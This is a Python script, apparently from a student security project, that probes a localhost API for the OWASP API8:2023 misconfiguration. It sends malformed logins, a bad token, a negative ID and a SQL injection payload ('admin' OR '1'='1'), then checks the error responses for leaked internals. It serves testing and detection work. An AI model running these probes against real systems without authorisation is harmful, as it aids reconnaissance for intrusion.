#!/usr/bin/env python3
"""
ATTACK 7: Security Misconfiguration
OWASP: API8:2023
What: API reveals sensitive info in error messages
How: Send malformed requests and analyse error responses
Why dangerous: Reveals internal structure to attackers
"""
import requests
import json
import datetime
import time

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token):
    print("=" * 55)
    print("ATTACK 7: SECURITY MISCONFIGURATION (API8:2023)")
    print("Verbose Error Messages & Exposed Information")
    print("=" * 55)

    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json"
    }

    findings = []

    tests = [
        {
            "name": "Empty password login",
            "method": "POST",
            "endpoint": "/identity/api/auth/login",
            "body": {"email": "test@test.com", "password": ""},
            "expect": "Should not reveal validation rules"
        },
        {
            "name": "Invalid token format",
            "method": "GET",
            "endpoint": "/identity/api/v2/user/dashboard",
            "headers": {"Authorization": "Bearer invalidtoken123"},
            "expect": "Should give generic error"
        },
        {
            "name": "SQL injection attempt",
            "method": "POST",
            "endpoint": "/identity/api/auth/login",
            "body": {"email": "admin' OR '1'='1", "password": "test"},
            "expect": "Should not reveal SQL errors"
        },
        {
            "name": "Negative ID parameter",
            "method": "GET",
            "endpoint": "/workshop/api/v2/mechanic/mechanic_report?report_id=-1",
            "expect": "Should give generic not found"
        },
    ]

    for test in tests:
        print("\n[TEST] " + test["name"])
        url = TARGET + test["endpoint"]
        try:
            if test["method"] == "POST":
                r = requests.post(url, json=test.get("body", {}),
                                 headers=test.get("headers", headers),
                                 timeout=5)
            else:
                r = requests.get(url,
                                headers=test.get("headers", headers),
                                timeout=5)

            response_text = r.text[:300]
            print("[STATUS] " + str(r.status_code))
            print("[RESPONSE] " + response_text)

            # Check for sensitive info leakage
            sensitive_keywords = [
                "stacktrace", "exception", "sql", "database",
                "internal", "validation", "field error",
                "size must be", "must not be blank",
                "springframework", "hibernate"
            ]

            leaks = []
            for keyword in sensitive_keywords:
                if keyword.lower() in response_text.lower():
                    leaks.append(keyword)

            if leaks:
                print("[!] SENSITIVE INFO LEAKED: " + str(leaks))
                findings.append({
                    "test": test["name"],
                    "status": r.status_code,
                    "leaked_keywords": leaks,
                    "response_snippet": response_text[:100]
                })
            else:
                print("[OK] No sensitive info in response")

            time.sleep(0.5)

        except Exception as e:
            print("[ERROR] " + str(e))

    print("\n[RESULT] " + str(len(findings)) + " misconfiguration issues found")
    print("[SEVERITY] MEDIUM")
    print("[SPLUNK] Check: index=api_logs 400 OR 500")

    result = {
        "attack": "Security Misconfiguration",
        "owasp": "API8:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "tests_run": len(tests),
        "findings": findings,
        "severity": "MEDIUM"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack7_misconfiguration_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
